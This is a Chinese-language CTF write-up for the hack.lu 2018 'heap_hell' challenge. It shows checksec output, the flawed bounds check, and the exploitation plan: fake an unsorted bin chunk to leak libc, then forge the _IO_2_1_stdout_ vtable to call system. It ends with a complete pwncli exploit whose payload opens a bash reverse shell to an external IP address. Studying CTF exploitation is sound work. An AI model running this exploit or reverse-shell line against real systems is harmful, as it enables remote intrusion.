# hack_lu_2018_heap_hell

# checksec

```bash
$ checksec hack_lu_2018_heap_hell.bk
[*] '/home/xxx/hack_lu_2018_heap_hell.bk'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

远程libc-2.23.so。

# 漏洞点

在读取输入的时候，可以溢出：

```c
BOOL8 __fastcall sub_14C8(__int64 a1, size_t a2)
{
  void *ptr; // [rsp+18h] [rbp-8h]

  ptr = (void *)(mmap_addr + a1);
  return mmap_addr + a1 > mmap_addr + 0x10000 - a2  //溢出绕过校验
      || (unsigned __int64)ptr < mmap_addr
      || a2 != fread(ptr, 1uLL, a2, stdin);
}
```

# 利用思路
- 伪造一个unsorted bin chunk，释放掉
- 泄露出libc地址
- 负数溢出，写_IO_2_1_stdout_结构体，伪造vtable，执行任意命令
- 关闭socket即可以使fread返回为0

# EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']


def write_heap(off, data, size=None):
    if size is None:
        size = len(data)
    sla("[4] : exit\n", "1")
    sla("How much do you want to write?\n", str(size))
    sla("At which offset?\n", str(off))
    s(data)


def free_heap(off):
    sla("[4] : exit\n", "2")
    sla("At which offset do you want to free?\n", str(off))

def view_heap(off):
    sla("[4] : exit\n", "3")
    sla("At which offset do you want to leak?\n", str(off))
    return rl()

mmap_addr = 0x10000
rls("Allocating your scratch pad")
sl(str(mmap_addr))


# leak addr
write_heap(0, flat_z({
    0: [0, 0x111],
    0x110: [
        0, 0x21,
        0, 0
    ] * 3
}))

free_heap(0x10)

m = view_heap(0x10)
libc_base = set_current_libc_base_and_log(u64_ex(m[:-1]), 0x3c4b78)

file_str = FileStructure()
file_str.vtable = libc.sym["_IO_2_1_stdout_"] + 0x10 + 0x20
file_str.chain = libc.sym['system']
file_str._lock = libc_base + 0x3c6780 # 这里指定一个lock地址即可

# 反弹shell可以成功
payload = b"/bin/bash -c \"bash -i > /dev/tcp/120.25.122.195/10001 0>&1 2>&1\"\x00".ljust(0x48, b"\x00")
payload += bytes(file_str)[0x48:]

write_heap(off=libc.sym._IO_2_1_stdout_ - mmap_addr, data=payload, size=mmap_addr + 0x10000 + 1)

io.shutdown("send")

ia()
```